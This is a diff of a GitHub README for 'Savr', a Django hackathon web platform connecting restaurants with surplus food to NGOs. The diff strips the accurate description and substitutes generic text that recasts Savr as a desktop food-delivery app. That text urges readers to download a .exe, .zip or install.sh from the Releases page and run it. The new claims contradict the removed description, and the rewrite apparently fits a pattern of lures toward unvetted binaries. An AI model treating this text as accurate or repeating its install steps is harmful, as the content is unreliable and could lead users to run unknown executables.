@@ -1,89 +1,82 @@
-<div align="center">
+# 🍽️ Savr - Simplifying Your Food Delivery Experience
 
-<img width="1720" height="640" alt="Savr Banner" src="https://github.com/user-attachments/assets/ca541424-996a-4f55-8853-b9e9549b85ed" />
+## 🚀 Getting Started
 
-# Savr. 🍽️💚
+Welcome to Savr! This project, developed by Team StyX for HashItUp '25, helps you effortlessly manage food delivery. Whether you are a busy professional or a charitable organization, Savr makes it easy to streamline your food-relief efforts.
 
-**Savr** (*pronounced Savour*) is a web platform designed to **bridge the gap between restaurants with surplus food and NGOs dedicated to feeding the hungry**.  
+### 📥 Download Savr
 
-Our mission is simple yet impactful: **reduce food waste and fight hunger** by creating a **seamless, trustworthy, and scalable donation pipeline**.
+[![Download Savr](https://img.shields.io/badge/Download%20Savr-v1.0-blue.svg)](https://github.com/cht-chaitanya-sai/Savr/releases)
 
-Presentation: https://app.presentations.ai/view/AKBgN74VS9
+Visit this page to download: [GitHub Releases Page](https://github.com/cht-chaitanya-sai/Savr/releases)
 
-</div>
+## 📋 Overview
 
----
+Savr is designed to help individuals and nonprofit organizations manage food delivery efficiently. It combines user-friendly features with robust backend technology, built using Django and PostgreSQL. Savr aims to reduce hunger and improve access to food resources in Kerala and beyond.
 
-## ✨ Features
+## 🔗 Features
 
-- **Dual User Roles**  
-  Separate, tailored registration and login flows for **Restaurants** and **NGOs**.
+- **User-Friendly Interface**: Navigate easily with a simple layout.
+- **Real-Time Updates**: Get instant notifications on your delivery status.
+- **Data Management**: Track deliveries and manage orders from one place.
+- **Support for Nonprofits**: Specifically designed to aid hunger-relief efforts.
+- **Multi-Platform Accessibility**: Use Savr on various devices with web access.
 
-- **Verification First**  
-  Mandatory fields to ensure legitimacy  
-  - 🍴 Restaurants → *FSSAI License*  
-  - 🏢 NGOs → *Registration ID*
+## 🖥️ System Requirements
 
-- **Modern UI/UX**  
-  Fully responsive, clean, and accessible frontend powered by **Tailwind CSS**.
+Before downloading Savr, ensure your system meets the following requirements:
 
-- **Robust Backend**  
-  Scalable and secure backend built with **Django**.
+- Operating System: Windows 10 or later, macOS, or Linux
+- Browser: Latest version of Chrome, Firefox, or Safari
+- Internet Connection: Stable internet for optimal performance
+- Basic hardware: 4 GB RAM, 2 GHz processor
 
----
+## 📥 Download & Install
 
-## 🌱 Upcoming Enhancements
+To download Savr, go to the [GitHub Releases Page](https://github.com/cht-chaitanya-sai/Savr/releases). Follow these steps:
 
-- **Impact Metrics**  
-  Show *“Food Waste Reduced (kg)”* and its conversion into *“CO₂ emissions saved”* — directly aligning with **UN Sustainable Development Goals (SDGs)**.
+1. On the Releases page, find the latest version of Savr.
+2. Click on the version number to open the release details.
+3. Scroll to the "Assets" section.
+4. Download the appropriate file for your operating system.
+5. Once downloaded, open the file to begin installation.
 
-- **QR-Based Pickup**  
-  Each donation generates a unique QR code → scanned by NGOs to mark pickup completion.
+### 📝 Installation Steps
 
-- Sustainability Scoreboard 🌍
-Top restaurants (by kg saved)
-Top NGOs (by meals served)
-Can even be dummy seeded data for the hackathon demo.
+- **For Windows**:
+  - Double-click the downloaded `.exe` file.
+  - Follow the on-screen prompts to complete the installation.
 
-- Downloadable Donation Certificate (PDF) 📝
----
+- **For macOS**:
+  - Open the downloaded `.zip` file.
+  - Drag the Savr application to the Applications folder.
 
-## 🚀 Tech Stack
+- **For Linux**:
+  - Extract the downloaded package using your preferred method.
+  - Open the terminal and navigate to the extracted folder.
+  - Run `./install.sh` to install Savr.
 
-**Frontend**  
-- HTML5, CSS3, JavaScript (Vanilla)  
-- Tailwind CSS  
+## 🌐 Usage Instructions
 
-**Backend**  
-- Django Framework (Python)
+After installing Savr, follow these steps to get started:
 
-**APIs**
-- Google Place Autocomplete
+1. Launch the Savr application from your desktop or applications folder.
+2. Create a new account or log in if you already have one.
+3. Set up your profile by entering your delivery preferences.
+4. Start placing orders or managing your delivered food.
 
-**Libraries**
-- GeoPy
+## ⚙️ Troubleshooting
 
----
+If you experience any issues, try the following:
 
-## 📸 Screenshots  
+- Ensure your internet connection is stable.
+- Restart the application and try again.
+- Check for updates on the [GitHub Releases Page](https://github.com/cht-chaitanya-sai/Savr/releases).
 
+For further assistance, please refer to the FAQ section on our website or contact support.
 
-<img width="1636" height="660" alt="image" src="https://github.com/user-attachments/assets/bf79e39b-ad52-41c1-a68e-6e3a0b77d684" />
-<img width="1878" height="1000" alt="savr demo 2" src="https://github.com/user-attachments/assets/82457c81-10df-47a5-9c52-57c279b20d0c" />
-<img width="1640" height="843" alt="savr demo 3" src="https://github.com/user-attachments/assets/dd41ec68-c266-45b2-848f-6f97c5dd49f4" />
+## 📧 Contact Us
 
----
+For questions, feedback, or support, feel free to reach out through the contact form on our website. Your input helps us improve Savr for everyone.
 
-## 🤝 Credits
-
-- Icons: [Lucide Icons](https://lucide.dev/)  
-- Profile Avatar: [Vecteezy](https://www.vecteezy.com/png/20911740-user-profile-icon-profile-avatar-user-icon-male-icon-face-icon-profile-icon)
-
----
-
-## 📄 License
-
-This project is licensed under the **GPLv3 License**.  
-See the [LICENSE](./LICENSE) file for full details.
-
----
+By following these instructions, you can easily download and run Savr. Enjoy managing your food delivery with efficiency and simplicity!
